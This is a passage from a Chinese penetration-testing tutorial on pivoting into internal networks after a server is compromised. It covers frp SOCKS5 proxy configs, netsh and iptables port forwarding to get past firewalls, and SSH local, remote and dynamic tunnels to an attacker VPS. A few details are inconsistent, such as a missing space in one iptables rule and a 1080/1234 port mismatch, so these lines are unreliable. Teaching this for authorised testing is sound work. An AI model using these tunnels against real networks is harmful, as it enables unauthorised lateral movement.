&amp;</span><br></pre></td></tr></table></figure><p><strong>客户端（Win2012-1）</strong></p><p>配置<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> =  <span class="number">192.168</span>.<span class="number">125.134</span> <span class="comment"># 服务端IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  通信端口</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># 服务端代理端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># 是否加密</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># 是否压缩</span></span><br></pre></td></tr></table></figure><p><strong>第二层内网</strong></p><p><strong>Win2012-1</strong></p><p>配置<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">192.168</span>.<span class="number">10.2</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p>配置<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> =  <span class="number">192.168</span>.<span class="number">125.134</span> <span class="comment"># 服务端IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  通信端口</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># 服务端代理端口</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># 是否加密</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># 是否压缩</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># plugin = socks5 # 不能加上这个</span></span><br><span class="line"><span class="comment">#相较于一级代理，增加如下代理服务器frps.ini</span></span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">10.2</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start/b C:\tmp\frps.exe -c frps.ini</span><br><span class="line">start/b C:\tmp\frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><p><strong>win7</strong></p><p>配置<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">125.134</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># 服务端代理端口</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># 是否加密</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># 是否压缩</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><ul><li><p><strong>目标有公网IP</strong></p><p><img src="/../images/image-20231015134119999.png" alt="image-20231015134119999"></p><p>​假设此时已经获取了Windows Server 2012的控制权,需要登录其远程桌面查看情况，但是防火墙对3389端口做了限制，不允许外网机器对3389端口进行连接。那么，通过端口转发，可以将3389端口转发到其他防火墙允许的端口上，如4444端口。</p><p>​效果：绕过防火墙限制，通过4444端口进行RDP远程连接</p></li><li><p><strong>内网主机端口转发到DMZ区主机端口</strong></p><p><img src="/../images/image-20231015134055635.png" alt="image-20231015134055635"></p><p>​假设已经获取Windows Server 2012的控制权，经过信息收集，获得内网中MySQL服务器的SSH登录凭据，接下来需要登录这台服务器。但是服务器位于内网，无法直接通过IP地址进行访问，所以需要通过端口映射，将 MySQL服务器的22端口映射到Windows Server 2012上的端口如2222。</p><p>​效果：访问DMZ区的Windows Server 2012的2222端口实质上是访问内网MySql服务器的22端口</p></li><li><p><strong>目标无公网IP</strong></p><p><img src="/../images/image-20231015134450143.png" alt="image-20231015134450143"></p><p>​假设已经获取 Windows Server 2012的控制权，需要登录其远程桌面查看情况，但是Windows Server 2012没有公网IP地址,无法直通过IP地址进行访问,所以需要公网VPS监听一个端口，将Windows Server 2012的3389端口转发到VPS的端口如4444上。</p><p>​效果：访问VPS的4444端口实质上是访问Windows Server 2012的3389端口</p></li></ul><h2 id="如何转发"><a href="#如何转发" class="headerlink" title="如何转发"></a>如何转发</h2><h3 id="Windows-netsh-端口转发（双网卡用）"><a href="#Windows-netsh-端口转发（双网卡用）" class="headerlink" title="Windows netsh 端口转发（双网卡用）"></a>Windows netsh 端口转发（双网卡用）</h3><p><code>netsh</code>仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p><p>将内网的3389端口转发到外网的6666端口上，实现访问外网的6666端口即访问内网的3389端口</p><p><strong>启动转发</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看现有规则</span></span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加转发规则</span></span><br><span class="line">netsh interface portproxy <span class="built_in">set</span> v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389</span><br></pre></td></tr></table></figure><p><strong>取消转发</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除转发规则</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=6666</span><br><span class="line"></span><br><span class="line"><span class="comment">#xp需要安装ipv6</span></span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure><h3 id="Linux-iptables-端口转发（高权限用）"><a href="#Linux-iptables-端口转发（高权限用）" class="headerlink" title="Linux iptables 端口转发（高权限用）"></a>Linux iptables 端口转发（高权限用）</h3><p>将内网的3389端口转发到外网的3389端口上</p><p><strong>编辑配置文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1<span class="comment">#开启IP转发</span></span><br></pre></td></tr></table></figure><p><strong>关闭服务</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure><p><strong>配置规则</strong></p><p>假设</p><p>需要访问的内网地址：10.1.1.11（Windows）</p><p>内网边界web服务器：192.168.100.100（Linux）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br></pre></td></tr></table></figure><p>将目标IP为192.168.100.100且目标端口为3389的TCP数据包，转发到10.1.1.11的3389端口。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br></pre></td></tr></table></figure><p>将目标IP为10.1.1.11且目标端口为3389的TCP数据包，发送出去时，将源IP地址改为192.168.100.100</p><p>(相当于实现了网络地址转换（NAT），将内部私有网络中的IP地址转换为公网IP地址)</p><p><strong>保存并重启服务</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure><h1 id="SSH端口转发"><a href="#SSH端口转发" class="headerlink" title="SSH端口转发"></a>SSH端口转发</h1><blockquote><p>SSH 端口转发功能能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。其实这一技术就是我们常常听说的隧道(tunnel)技术，原因是 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输。</p></blockquote><p>推荐阅读：<a href="https://lotabout.me/2019/SSH-Port-Forwarding/">SSH 端口转发教程 | 三点水 (lotabout.me)</a></p><h2 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h2><p><strong>本地端口转发指的是在本机上发起请求，由 ssh client 转发到远程的机器上</strong></p><p><img src="/../images/local-port-forwarding-two.svg" alt="img"></p><p>假设A为攻击机VPS，B为DMZ区主机，C为内网主机，A能访问B</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh client即攻击机VPS执行</span></span><br><span class="line">ssh -CfNg -L 1234:ip_c:3389 user_b@ip_b</span><br></pre></td></tr></table></figure><p>参数解释</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-C 选项使用压缩算法进行数据传输，可以提高传输效率。</span><br><span class="line">-f 选项将SSH会话放入后台运行。</span><br><span class="line">-N 选项表示不执行远程命令，仅用于建立隧道。</span><br><span class="line">-g 选项允许其他主机连接该隧道。</span><br><span class="line">-L 1234:ip_c:3389 user_b@ip_b 选项指定在本地监听1234端口，并将所有通过该端口的流量转发到目标主机C的3389端口。</span><br></pre></td></tr></table></figure><p>实现了访问攻击机1234端口实质上是访问内网主机C的3389端口</p><h2 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h2><p>把最终请求的发起方（机器 A）为“本地”，服务所在的机器 B&#x2F;C 为“远程”，在本地机器上执行 <code>ssh</code> 命令就称为“本地转发”，在远程机器上执行命令就称为“远程转发”</p><p><img src="/../images/remote-port-forwarding.svg" alt="img"></p><p>假设A为攻击机VPS，B为DMZ区主机，C为内网主机，A不能访问B，B能访问A</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh cilent即DMZ区主机执行</span></span><br><span class="line">ssh -CfNg -R 9992:ip_c:3389 user_a@ip_a</span><br></pre></td></tr></table></figure><p>参数解释</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-R 9992:ip_c:3389 user_a@ip_a 选项指定在远程主机（即攻击机vps）监听9992端口，并将所有通过该端口的流量转发到本地的内网主机C的3389端口。</span><br></pre></td></tr></table></figure><p>实现了访问攻击机9992端口实际上是访问内网主机C的3389端口</p><h2 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h2><p>本地转发和远程转发都只转发一个端口，动态转发可以转发所有端口</p><p><img src="/../images/dynamic-port-forwarding.svg" alt="img"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh cilnet即攻击机VPS执行</span></span><br><span class="line">ssh -qTfnN -D 1234 user_b@ip_b</span><br></pre></td></tr></table></figure><p>参数解释</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-q 选项表示安静模式，减少输出信息。</span><br><span class="line">-T 选项表示不分配终端。</span><br><span class="line">-f 选项将SSH会话放入后台运行。</span><br><span class="line">-n 选项表示不执行远程命令。</span><br><span class="line">-N 选项表示不执行远程命令，仅用于建立隧道。</span><br><span class="line">-D 1080 选项指定在本地监听1080端口，并将流量通过SSH通道转发。</span><br></pre></td></tr></table></figure><p>在本地建立一个SSH动态端口转发（SOCKS代理），将本地的1080端口设置为SOCKS代理服务。通过这个代理，可以将本地的网络流量通过SSH加密通道转发到远程主机B上，从而访问内网主机C</p><h1 id="全局代理流量"><a href="#全局代理流量" class="headerlink" title="全局代理流量"></a>全局代理流量</h1><ul><li>Linux：Proxychinas</li><li>Windows：Proxifier</li></ul><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>reGeorg上传的tunnel无法解析</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
